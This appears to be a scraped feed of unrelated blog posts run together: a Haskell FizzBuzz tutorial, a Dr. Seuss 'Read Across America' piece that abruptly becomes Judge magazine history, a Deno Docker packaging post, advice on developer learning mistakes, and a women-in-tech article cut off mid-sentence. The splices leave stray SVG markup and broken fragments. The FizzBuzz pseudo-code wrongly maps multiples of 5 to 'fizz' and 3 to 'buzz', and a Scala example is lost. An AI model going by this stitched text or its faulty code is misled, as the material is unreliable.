March 4, 2021 | https://beny23.github.io/posts/fizzbuzz_without_ifs/ | <a href="https://web.archive.org/web/*/https://beny23.github.io/posts/fizzbuzz_without_ifs/">archive.org</a>
<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div><p><img src="https://beny23.github.io/images/fizzbuzz_without_ifs_title.png" alt=""></p><p>In this writing I aim to complete a Fizzbuzz without if statements, conditionals, pattern matching
or even using modulus calculations. And if that isn’t enough I thought I’d use the opportunity
to explore <a href="https://www.haskell.org/">Haskell</a>.</p><p>The idea originated in the Friday lunchtime “Curry Club” at HMRC Digital where a few like-minded software engineers
are getting together to teach themselves Haskell. (For those not in on the joke, the language is named
after the logician Haskell Curry). At one of those sessions, talking about ifs and conditionals the
challenge was posited that a Fizzbuzz can be done without ifs.</p><p>A Fizzbuzz test is a fairly common programming challenge, often used to evaluate a developer’s
skill level. The basic instructions are as follows</p><blockquote><p>Write a class that produces the following for any contiguous range of integers:</p><p>the number</p><ul><li>‘fizz’ for numbers that are multiples of 3</li><li>‘buzz’ for numbers that are multiples of 5</li><li>‘fizzbuzz’ for numbers that are multiples of 15</li></ul><p>e.g. Running the program with a range from 1-20 should produce the following result:</p><p><code>1 2 fizz 4 buzz fizz 7 8 fizz buzz 11 fizz 13 14 fizzbuzz 16 17 fizz 19 buzz</code></p></blockquote><p>Now, I’ve marked a fair number of fizzbuzz challenges in my time and the most important piece of
advice is: Keep it simple!</p><p>Under normal condition, the following pseudo code lends itself to the better solutions:</p><pre><code>if (number is multiple of 15) print "fizzbuzz"
else if (number is multiple of 5) print "fizz"
else if (number is multiple of 3) print "buzz"
else print number
</code></pre><p>It does not try to be clever (many candidates fall down because they want to show off the latest
shiny technique, but technical interviewers wouldn’t be looking to that) and does the job. Simple!</p><p>So how could this be achieved without if clauses or using modulo calculations? I would class
pattern matching as cheating here, so the following scala snippet would also be disqualified:</p><div><div><table><tbody><tr><td><pre><code><span>1

scala<span>&gt;</span>
</code></pre></td></tr></tbody></table></div></div><p>I’ll just go ahead and show what I ended up coming up with:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> replace n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>Prelude</span><span>&gt;</span> replace <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span> <span>$</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"fizz"</span>,<span>"4"</span>,<span>"buzz"</span>,<span>"fizz"</span>,<span>"7"</span>,<span>"8"</span>,<span>"fizz"</span>,<span>"buzz"</span>,<span>"11"</span>,<span>"fizz"</span>,<span>"13"</span>,<span>"14"</span>,<span>"fizzbuzz"</span>,<span>"16"</span>,<span>"17"</span>,<span>"fizz"</span>,<span>"19"</span>,<span>"buzz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>Now I will break it down. The intuition was that I would be able to use a method loosely (very loosely)
inspired by the Sieve of Eratosthenes, whereby I would create lists of functions that would replace
every 3rd element by “fizz”, every 5th element by “buzz” and every 15th element by “fizzbuzz”.</p><p>So essentially what I was after are lists like so</p><pre><code>["1", "2", "3", "4", "5", "6", "7", "8", "9", "10", "11", "12", "13", "14", "15", ...]
["", "", "fizz", "", "", "fizz", "", "", "fizz", "", "", "fizz", "", "", "fizz", ...]
["", "", "",     "", "buzz", "", "", "", "",     "buzz", "", "", "", "", "buzz", ...]
["", "", "",     "", "",     "", "", "", "",     "",     "", "", "", "", "fizzbuzz", ...]
</code></pre><p>where any non-empty values replace the values in the previous list. To do so, I use a mixture
of <code>replicate</code> and <code>cycle</code>.</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell">(replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v]
</code></pre></td></tr></tbody></table></div></div><p>This creates a list where the <code>id</code> function repeated <code>n-1</code> times followed by a lambda that ignores the
input and just replaces it with a value. So if a call this with <code>n=3</code> and <code>v="fizz"</code>, what I get is:</p><pre><code>[id, id, \x -&gt; v]
</code></pre><p>Then I use the <code>cycle</code> function to create an infinite repeating list. This makes use of the fact that
Haskell is lazily evaluated, meaning that I list can be defined as infinite but its constituent elements
are not created until they’re used, so:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span></code></pre></td><td><pre><code data-lang="haskell"><span>cycle</span> [id, id, <span>\</span>x <span>-&gt;</span> v] <span>=</span> 
  [id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v, <span>...</span>]
</code></pre></td></tr></tbody></table></div></div><p>This gives me my <code>replace</code> function:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell"><span>replace</span> n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
</code></pre></td></tr></tbody></table></div></div><p>whereby <code>zipWith ($) listOfFunctions values</code> creates a new list that applies the first function to
the first value, second function to the second value, etc, so, if call this with <code>n=6</code> and <code>v="fizz"</code>
and <code>xs=[1..6]</code>, the following substitutions can be made:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span><span>4
</span><span>5
</span><span>6
</span></code></pre></td><td><pre><code data-lang="haskell"><span>zipWith</span> (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>zipWith</span> (<span>$</span>) (cycle ((replicate <span>2</span> (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> <span>"fizz"</span>])) [<span>"1"</span><span>..</span><span>"6"</span>]
<span>zipWith</span> (<span>$</span>) (cycle [id, id, <span>\</span>x <span>-&gt;</span> v]) [<span>"1"</span><span>..</span><span>"6"</span>]
<span>zipWith</span> (<span>$</span>) [id, id, <span>\</span>x <span>-&gt;</span> v, id, id, <span>\</span>x <span>-&gt;</span> v] [<span>"1"</span><span>..</span><span>"6"</span>]
[id <span>$</span> <span>"1"</span>, id <span>$</span> <span>"2"</span>, <span>"3"</span> <span>-&gt;</span> <span>"fizz"</span>, id <span>$</span> <span>"4"</span>, id <span>$</span> <span>"5"</span>, <span>"6"</span> <span>-&gt;</span> <span>"fizz"</span>]
[<span>"1"</span>, <span>"2"</span>, <span>"fizz"</span>, <span>"4"</span>, <span>"5"</span>, <span>"fizz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>So to put it all together, we then want to replace all the “fizz”, “buzz” and “fizzbuzz” entries in
our list, to do that I think the dot operator in Haskell makes for nice reading:</p><p>so the snippet</p><div><div><table><tbody><tr><td><pre><code><span>1
</span></code></pre></td><td><pre><code data-lang="haskell"><span>replace</span> <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span>
</code></pre></td></tr></tbody></table></div></div><p>just creates a single function that first replaces all the “fizz”, then “buzz”, then “fizzbuzz”</p><p>Finally, we’ve got our list of numbers. But in this case we don’t actually want a list of numbers,
as our <code>replace</code> function is expecting strings, so the following creates our list of string
by using the <code>show</code> function</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"3"</span>,<span>"4"</span>,<span>"5"</span>,<span>"6"</span>,<span>"7"</span>,<span>"8"</span>,<span>"9"</span>,<span>"10"</span>,<span>"11"</span>,<span>"12"</span>,<span>"13"</span>,<span>"14"</span>,<span>"15"</span>,<span>"16"</span>,<span>"17"</span>,<span>"18"</span>,<span>"19"</span>,<span>"20"</span>]
</code></pre></td></tr></tbody></table></div></div><p>We just combine the function with our list and there’s the Fizzbuzz answer:</p><div><div><table><tbody><tr><td><pre><code><span>1
</span><span>2
</span><span>3
</span></code></pre></td><td><pre><code data-lang="haskell"><span>Prelude</span><span>&gt;</span> replace n v xs <span>=</span> zipWith (<span>$</span>) (cycle ((replicate (n<span>-</span><span>1</span>) (id)) <span>++</span> [<span>\</span>x <span>-&gt;</span> v])) xs
<span>Prelude</span><span>&gt;</span> replace <span>15</span> <span>"fizzbuzz"</span> <span>.</span> replace <span>5</span> <span>"buzz"</span> <span>.</span> replace <span>3</span> <span>"fizz"</span> <span>$</span> map show [<span>1</span><span>..</span><span>20</span>]
[<span>"1"</span>,<span>"2"</span>,<span>"fizz"</span>,<span>"4"</span>,<span>"buzz"</span>,<span>"fizz"</span>,<span>"7"</span>,<span>"8"</span>,<span>"fizz"</span>,<span>"buzz"</span>,<span>"11"</span>,<span>"fizz"</span>,<span>"13"</span>,<span>"14"</span>,<span>"fizzbuzz"</span>,<span>"16"</span>,<span>"17"</span>,<span>"fizz"</span>,<span>"19"</span>,<span>"buzz"</span>]
</code></pre></td></tr></tbody></table></div></div><p>In summary, I’ve tried to get an alternative view on how a Fizzbuzz can be implemented, without
using the traditional tools. Now, if I’m honest, if I were to mark such a submission, I would be disappointed
that it doesn’t allow me to use arbitrary ranges. My solution above would not provide the correct answer
for a range that doesn’t start with 1.</p><p>This was a fun exercise and hope will give you some food for thought.</p><p><a href="https://news.ycombinator.com/item?id=26353967">Discuss on Hackernews</a></p><ul></ul></div></div>]]>

<br/><!-- hnss:readable-content --><hr/><div id="readability-page-1" class="page"><div itemprop="articleBody">

<p><br>Today marks the 20th Anniversary of the National Education Association’s (NEA) “Read Across America” Day — an event observed every year on Dr. Seuss’s birthday. It is the largest celebration of reading in America, with over 45 million students, parents, teachers, libraries and community centers participating. Dr. Seuss books and activities are central to the annual celebration — schools have Dr. Seuss-themed festivals, eat “green eggs and ham”, and get dressed up as their “favorite Dr. Seuss character”. The NEA sells Dr. Seuss merchandise through their <a href="http://www.raastore.com/site/" target="_blank"><em>website</em></a>, and kids across America will be seen wearing the <a href="http://www.readacrossamerica.org/pledges/" target="_blank"><em>red and white striped hats</em></a> from the book, The Cat in the Hat.</p>
<p>Theodor Seuss Geisel, aka “Dr. Seuss,” has sold over 600 million copies of his books and is a widely celebrated and beloved children’s book author. Most people in America, and even globally (Dr. Seuss books are translated into 20 languages), know of his classic titles. What it not as well known (or acknowledged), is his work publishing racist and xenophobic political cartoons.<br>
</p>








<hr>

<p><br>It was launched by artists who had seceded from its rival Puck. The founders included cartoonist James Albert Wales, dime novels publisher Frank Tousey and author George H. Jessop.</p>
<p>The first printing of Judge was on October 29, 1881, during the Long Depression. It was 16 pages long and printed on quarto paper. While it did well initially, it soon had trouble competing with Puck. William J. Arkell purchased the magazine in the middle 1880s. Arkell used his considerable wealth to persuade the cartoonistss Eugene Zimmerman (“Zim”) and Bernard Gillam to leave Puck. A supporter of the Republican Party, Arkell persuaded his cartoonists to attack the Democratic administration of Grover Cleveland. With G.O.P. aid, Judge boomed during the ’80s and ’90s, surpassing its rival publication in content and circulation. By the early 1890s, the circulation of the magazine reached 50,000.</p>
<p>Under the editorial leadership of Isaac Gregory, 1886–1901, Judge allied with the Republican Party and supported the candidacy of William McKinley largely through the cartoons of leading cartoonist Grant E. Hamilton. Circulation for Judge was about 85,000 in the 1890s. By the 1900s, the magazine had become successful, reaching a circulation of 100,000 by 1912.

        <path d="M10 6 L2 16 10 26 M2 16 L30 16"></path>
    </svg>Home</a><p>I’ve been following <a href="https://deno.land/">deno</a> from a far for a while now, I’m particularly interested in it for two reasons.</p><ol><li>First class typescript support - I hate having to compile things with babel or webpack and then having to run them via node in production it always ends-up being a little brittle &amp; complicated with everyone having their own home grown scripts and workflows for dev and production.</li><li>Compiled executables - Scripting languages are really neat for making little tools, but they are pretty hard to distribute. For that reason I’ve been using Go for <a href="https://hobochild.com/#tools">small utilities</a>, but I’d much prefer to write these tools in something like python or javascript.</li></ol><p>So I thought I’d dip my toes in and see how a packaged app would look. Deno has fairly unique dependency story compared to javascript’s npm ecosystem. It pulls dependencies from remote urls on first run and then caches them until you clear the cache, very similar to how a browser loads a webpages dependencies.</p><blockquote><p>If you want to skip the rest and just check out the code it can be found 👉 <a href="https://github.com/hobochild/deno-demo">here</a></p></blockquote><p>The first thing to figure out was how to create a reproducible build, turned out to be fairly easy you can create a lock file with:</p><pre><code><pre>deno cache --lock<span>=</span>lock.json --lock-write src/deps.ts
</pre></code></pre><p>And then install with that lock file using:</p><pre><code><pre>deno cache --reload --lock<span>=</span>lock.json src/deps.ts
</pre></code></pre><p>The next was how to make that build as small as possible, I did this by using deno’s compile feature which can cross-compile standalone binaries (quite similar to vercel’s <a href="https://www.npmjs.com/package/pkg">pkg</a>). The linux executable is dynamically linked with <code>glibc</code> so you’ll that present, luckily most systems have this. I unfortunately encountered the issue because I tried to use the vanilla apline image.</p><p>The results:</p><p><a href="https://github.com/hobochild/deno-demo">The code</a> is fairly self explanatory. It’s a <a href="https://github.com/hobochild/deno-demo/Dockerfile">multi-stage docker build</a> for a bare-bones <code>oak</code> server (comparable to node.js’s express). There are 3 useful make targets.</p><ol><li><code>make size_uncompressed</code> - this will give you the <a href="https://hobochild.com/posts/ondisk">ondisk</a> size of the image.</li></ol><p>The on disk size comes out a 53.3mb (30mb of this is your executable) the rest is the apline image. (Node apline image is 116MB)</p><ol><li><code>make size_compressed</code> - This will give you the gzipped image size which should be comparable to what you’d pull from a registry.</li></ol><p>The compressed size comes in at 21mb, the node.js apline image by comparison is 38.93 MB</p><ol><li><code>make run</code> - run the server.</li></ol><p>My little experience with deno has been very positive so far. I really like how it’s cleaning up typescript &amp; javascript’s disparate ecosystem and creating a uniform toolkit for building software.</p><p>Next I’m looking forward to try out their built in test framework too see how that fairs against more established things like jest.</p></div></div>]]>

They are not optional extras but are vital to the successful achievement of their career goals. However, there are some common learning mistakes that developers often make regardless of where they are currently in their careers.</p><p id="ed23">The common learning mistakes are:</p><ol><li id="bcd6">Not having a learning plan.</li><li id="cb91">Not setting a clear end goal.</li><li id="fd0d">Choosing too broad a topic.</li><li id="406e">Having a consumption overload.</li><li id="ffb4">Not keeping track of progress.</li></ol></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of person on laptop" src="https://miro.medium.com/max/11520/0*ZdqNg4jjyniaoCe2" width="5760" height="3840" srcset="https://miro.medium.com/max/552/0*ZdqNg4jjyniaoCe2 276w, https://miro.medium.com/max/1104/0*ZdqNg4jjyniaoCe2 552w, https://miro.medium.com/max/1280/0*ZdqNg4jjyniaoCe2 640w, https://miro.medium.com/max/1400/0*ZdqNg4jjyniaoCe2 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ZdqNg4jjyniaoCe2?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@chuklanov?utm_source=medium&amp;utm_medium=referral" rel="noopener">Avel Chuklanov</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="7042">There is a saying that if you fail to plan, you plan to fail, and this applies to learning too. Sometimes, developers get impatient and plunge straight into active learning without any preparation. For example, a developer might say they want to learn a JavaScript framework, React. They may start reading tutorials about React without any outline on what areas they want to focus on, or how to get to their end goal: being able to write React applications.</p><p id="6916">The better way of learning, in this case, will be looking at the official documentation, going through the step-by-step approach from main concepts to advanced guides and API references, and creating a sample application in React. After this, looking at and learning from other examples out there and setting SMART goals for each stage of their learning will be helpful. S.M.A.R.T. goals are good goals because they’re specific, measurable, achievable, realistic, and time-bound.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a bullseye" src="https://miro.medium.com/max/10336/0*ycA_TuwSGX-DwcOr" width="5168" height="3448" srcset="https://miro.medium.com/max/552/0*ycA_TuwSGX-DwcOr 276w, https://miro.medium.com/max/1104/0*ycA_TuwSGX-DwcOr 552w, https://miro.medium.com/max/1280/0*ycA_TuwSGX-DwcOr 640w, https://miro.medium.com/max/1400/0*ycA_TuwSGX-DwcOr 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*ycA_TuwSGX-DwcOr?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@enginakyurt?utm_source=medium&amp;utm_medium=referral" rel="noopener">engin akyurt</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1985">There are so many new technologies and new ways of doing things in the <a href="https://hackernoon.com/tagged/software-development" rel="noopener">software development</a> industry. Don’t get me wrong; I believe continuous learning is a good thing. You can only grow your skill set and knowledge if you are open to learning. However, if a developer has too much FOMO (Fear of Missing Out) about learning every new thing that they hear about — then there will be no time left for being productive or putting her knowledge and skills to good use.</p><p id="bcfd">Before you learn something, I’d encourage you to think about why you’re learning it — and where and how you’ll use your newly learned knowledge or skill. For example, if you’re a backend developer, and you’re learning JavaScript, you’re doing so because your goal is to move to full-stack development. Or, if you’re a DevOps and learning AWS, you might be doing so to increase your chance of a new employment opportunity at a company that uses AWS.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of the sea and sky." src="https://miro.medium.com/max/12408/0*bfFnMGfMLjIakmKq" width="6204" height="4136" srcset="https://miro.medium.com/max/552/0*bfFnMGfMLjIakmKq 276w, https://miro.medium.com/max/1104/0*bfFnMGfMLjIakmKq 552w, https://miro.medium.com/max/1280/0*bfFnMGfMLjIakmKq 640w, https://miro.medium.com/max/1400/0*bfFnMGfMLjIakmKq 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bfFnMGfMLjIakmKq?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mattmaber?utm_source=medium&amp;utm_medium=referral" rel="noopener">Matthew Maber</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="aa08">Ever heard of the saying — everything but the kitchen sink? Sometimes, developers get too greedy with wanting to know everything about a topic that they fail to narrow down and, instead, set a very broad learning objective. How broad is too broad, I hear you ask. In my opinion, a topic is too broad if you can’t articulate your learning outcomes in a few words to another developer.</p><p id="6bd4">Learning outcomes are statements about knowledge or skill a developer should acquire by the end of their learning journey on a specific topic. Sure, you can learn about a particular topic forever, but there must be a point when you decide for yourself that it is enough, for now. Enough for you to feel confident in working toward and achieving your end goal.</p><p id="dc7e">For example, here are some learning outcomes for learning React Javascript framework.</p><p id="b7ae">By the end of my learning program, I should be able to create a new React app from scratch that can:</p><ul><li id="db4c">Consume JSON payload in a REST API</li><li id="54a3">Refresh the content of the app every <code>x</code> mins</li><li id="d377">Navigate to different screens</li><li id="2fa8">Remember the last screen I visited before (if any)</li><li id="24ff">Be Unit-tested</li></ul><p id="6ee5">Note that the above learning outcomes are not too specific or detailed (like creating a component in JSX syntax, for example) because you don’t know about the ins and outs of the React framework yet. They are not too broad either; there is a clear outcome for each statement instead of just a broad, generic one, like “Create a React app.”</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of multiple waterfalls" src="https://miro.medium.com/max/9216/0*YWDZfhREIQqoJ_fy" width="4608" height="3008" srcset="https://miro.medium.com/max/552/0*YWDZfhREIQqoJ_fy 276w, https://miro.medium.com/max/1104/0*YWDZfhREIQqoJ_fy 552w, https://miro.medium.com/max/1280/0*YWDZfhREIQqoJ_fy 640w, https://miro.medium.com/max/1400/0*YWDZfhREIQqoJ_fy 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*YWDZfhREIQqoJ_fy?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mikeanywhere?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike Lewis HeadSmart Media</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="c174">Tutorial fatigue — it’s real. If you think you’re learning something by going through endless books, videos, and tutorials then you’re simply wasting your time. Pick a few options, be it books, videos, or any other format, and stick with them. Chances are what you learn in a video will be very similar to another tutorial that you’re reading on the same topic.</p><p id="7c5d">To give you another example, I did a quick search on Amazon about React Javascript framework, and there were about 700 books on the topic — a few of them even have the exact same book title, <em>Learning React</em>. There is no way you can get through all the books, and even if you did, it is no guarantee that you’ll become an expert at React, or is it a good use of your time.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of a loading screen" src="https://miro.medium.com/max/12096/0*5fuYpC-mFVleIePR" width="6048" height="4024" srcset="https://miro.medium.com/max/552/0*5fuYpC-mFVleIePR 276w, https://miro.medium.com/max/1104/0*5fuYpC-mFVleIePR 552w, https://miro.medium.com/max/1280/0*5fuYpC-mFVleIePR 640w, https://miro.medium.com/max/1400/0*5fuYpC-mFVleIePR 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*5fuYpC-mFVleIePR?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@mike_van_den_bos?utm_source=medium&amp;utm_medium=referral" rel="noopener">Mike van den Bos</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="a189">Having a clear plan and a definite goal is good, but they serve little purpose if you’re not keeping track of how you’re progressing — and if you’re reaching your goals. Review your progress every fortnight, or at least every month, and ask yourself whether you are heading in the right direction.</p><p id="568e">I recommend setting up a reminder in your calendar to review your progress at a regular interval at the start of your learning journey — so you don’t forget about it. If you’re not achieving your goals timely, it’s a chance for you to understand where you may be struggling with and revise your plan. On the other hand, if you’re achieving your goals, celebrate them to keep your momentum and motivation going.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Image of an apple, some book, crayons" src="https://miro.medium.com/max/7906/0*WItSN7T0lYfj_6P1" width="3953" height="2791" srcset="https://miro.medium.com/max/552/0*WItSN7T0lYfj_6P1 276w, https://miro.medium.com/max/1104/0*WItSN7T0lYfj_6P1 552w, https://miro.medium.com/max/1280/0*WItSN7T0lYfj_6P1 640w, https://miro.medium.com/max/1400/0*WItSN7T0lYfj_6P1 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*WItSN7T0lYfj_6P1?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@element5digital?utm_source=medium&amp;utm_medium=referral" rel="noopener">Element5 Digital</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a></figcaption></figure><p id="1ed7">In this day and age, being an efficient learner gives you an edge and sets you up for your career success. I’m a firm believer that you can get better at anything in life if you take the time to understand the process — and have the willingness to improve. Learning is no exception. It is a skill that can be improved with practice. And knowing what not to do is sometimes as important as knowing what to do when it comes to learning. Just like what Confucius, a Chinese social philosopher, once said:</p><blockquote><p id="e923">“Learning without thought is labor lost; thought without learning is perilous. “— Confucius</p></blockquote></div></div></section></div></div>]]>

It’s great to see because if companies only focus on hiring female talent and do not put as much effort into supporting them and creating an environment that enables them to thrive, it would be like collecting water with leaky buckets.</p><p id="c893">The truth is that women in tech are not all that different from women in other industries. However, the tech industry is known for having a large gender gap and many women quit tech mid-career because they do not get the support that they need. I spoke to a friend of mine who works in Human Resources (HR). HR is well-known for having the most female talent. She wants the same things as I want, but she said she doesn’t have much trouble getting what she wants to thrive in her career. So why do many women in technology say they face a lot of setbacks and struggle to grow their careers and stay in the workforce?</p><p id="3bc9">As I thought about it more, here is a possible reason: It is because there are not many women in technology. When we make requests, talk about what we need, or try to be heard, we have to work harder because we are not the norm. We don’t represent the majority of the workforce and we are often seen as wanting different things than what most our colleagues, who are male, want.</p><p id="a9bf">As a result, many technology leaders and companies don’t know how to accommodate and handle issues and requests from female employees simply because they don’t experience them often.</p><p id="4662">There are also harsh expectations and standards imposed on us by society. A classic example of a double standard is when a woman is assertive, she is called bossy. When a man is assertive, he is considered to be a leader. Moreover, when a female leader embodies feminine characteristics such as kindness and empathy, they are considered to be “soft.”</p><p id="e8ad">In celebration of International Women’s Day (March 8), I’d like to share with you six actions that companies should take to make a difference in retaining and promoting female talent. And I can say this with absolute confidence because I am backed by gender-based research as well as my personal experience as a woman in technology, a working mother, a manager, and a mentor of female talent in the industry.</p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Woman working on laptop next to baby" src="https://miro.medium.com/max/6400/0*vjPKWMdlxBDG9WcG" width="3200" height="2133" srcset="https://miro.medium.com/max/552/0*vjPKWMdlxBDG9WcG 276w, https://miro.medium.com/max/1104/0*vjPKWMdlxBDG9WcG 552w, https://miro.medium.com/max/1280/0*vjPKWMdlxBDG9WcG 640w, https://miro.medium.com/max/1400/0*vjPKWMdlxBDG9WcG 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*vjPKWMdlxBDG9WcG?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@standsome?utm_source=medium&amp;utm_medium=referral" rel="noopener">Standsome Worklifestyle</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a>.</figcaption></figure><p id="7168">According to comprehensive research done by <em>The Wall Street Journal </em>on <a href="http://graphics.wsj.com/how-men-and-women-see-the-workplace-differently/" rel="noopener">How Men &amp; Women See the Workplace Differently</a>, 36% of women and 7% of men said they do more work at home. On the flip side, 7% of women and 30% of men said they do less at home.</p><p id="327d">What these statistics say is that if something comes up at home or with a woman’s family, she is more likely to drop her work and go home to sort it out — unless she is among 7% of the female population whose partners do more at home. This figure aligns with the reason why there are fewer women at the top of the industry.</p><p id="3dd0">Here is my personal experience: I often see a lot more mothers than fathers helping out and being present at my daughter’s school events. Also, my family is the most important thing to me and I am more than happy to show my commitment to my family by putting them at the top of my priority list and being available for them at any time. Even as someone who is known for being career-driven and motivated, I would choose flexibility over a promotion, higher pay, or a more interesting role if I had to make a choice.</p><p id="580f"><em>Question: Does your company provide flexible hours and an option to work from home if necessary?</em></p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Two workers high-fiving each other" src="https://miro.medium.com/max/19008/0*QrBm-kjb0cnne_OR" width="9504" height="6336" srcset="https://miro.medium.com/max/552/0*QrBm-kjb0cnne_OR 276w, https://miro.medium.com/max/1104/0*QrBm-kjb0cnne_OR 552w, https://miro.medium.com/max/1280/0*QrBm-kjb0cnne_OR 640w, https://miro.medium.com/max/1400/0*QrBm-kjb0cnne_OR 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*QrBm-kjb0cnne_OR?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@krakenimages?utm_source=medium&amp;utm_medium=referral" rel="noopener">krakenimages</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a>.</figcaption></figure><p id="c7fc">From the same research, it was revealed that more men than women say they interact with senior leaders about their work at least once a week — in all levels of their career, from entry to mid all the way to senior level.</p><p id="05a7">For a woman, access to senior management means access to valuable insights and an opportunity to talk about her work and get feedback on it. It also increases visibility and opens up opportunities that she may not have had if she just put her head down and worked hard. Unfortunately, access to leadership and informal mentorship do not happen often enough for women.</p><p id="cfbe">I really noticed what this access to senior management did for my career when I became a manager after being an individual contributor. When I was an individual contributor, I had great ideas and capabilities too, but because I was never asked and I felt like senior management would not be interested in what I had to offer, I just kept my head down and did a good job in my role. Nothing else. There was no avenue for me to share my thoughts and ideas with senior management, but if I had, I could have contributed a lot more to the business or stayed longer at certain organisations. Early in my career, my average tenure at any place of employment was two years.</p><p id="d2d2"><em>Question: Does your company have a mentor-mentee program that actively helps female employees find suitable mentors?</em></p></div></div></section><section><div><div><figure><div role="button" tabindex="0"><div><div><p><img alt="Woman smiling in front of whiteboard" src="https://miro.medium.com/max/12032/0*bhH_tRzPDGrEK-t-" width="6016" height="4016" srcset="https://miro.medium.com/max/552/0*bhH_tRzPDGrEK-t- 276w, https://miro.medium.com/max/1104/0*bhH_tRzPDGrEK-t- 552w, https://miro.medium.com/max/1280/0*bhH_tRzPDGrEK-t- 640w, https://miro.medium.com/max/1400/0*bhH_tRzPDGrEK-t- 700w" sizes="700px" data-old-src="https://miro.medium.com/max/60/0*bhH_tRzPDGrEK-t-?q=20"></p></div></div></div><figcaption>Photo by <a href="https://unsplash.com/@wocintechchat?utm_source=medium&amp;utm_medium=referral" rel="noopener">Christina @ wocintechchat.com</a> on <a href="https://unsplash.com/?utm_source=medium&amp;utm_medium=referral" rel="noopener">Unsplash</a>.</figcaption></figure><p id="509b">According to <a href="https://www.jstor.org/stable/4168132?seq=1" rel="noopener">a study by Robert K. Herbert</a>, it was found that women (18.9%) give more explicit compliments than men (3.3%) do.</p><p id="7d78">And this means women expect the same when they are on the other end. A thoughtful compliment, some praise, or recognition instead of a generic comment would go a long way.</p><p id="ade4">Regular recognition and praise mean her work is being recognised. When feedback is specific (e.g. “The investigation that you did on X project saved a few days of development work, as we understood the space better”) instead of general (e.g. “You’re doing well!” or “Fantastic work!”), that means the other person really notices and appreciates the value that you bring to the organisation.</p><p id="78a8">Women also see promotion as recognition and acknowledgment of their work. In general, feeling valued is more important to them than feeling as though they’re winning.</p><p id="d268">And last but not least, women tend to deflect/evade positive comments from others, but this doesn’t mean they don’t need or want them. So if you are a manager of a female employee, don’t take this the wrong way and keep giving thoughtful compliments. This way, you’ll have an engaged and happy employee.</p><p id="fe81">I used to think recognition didn’t matter to me. I was always 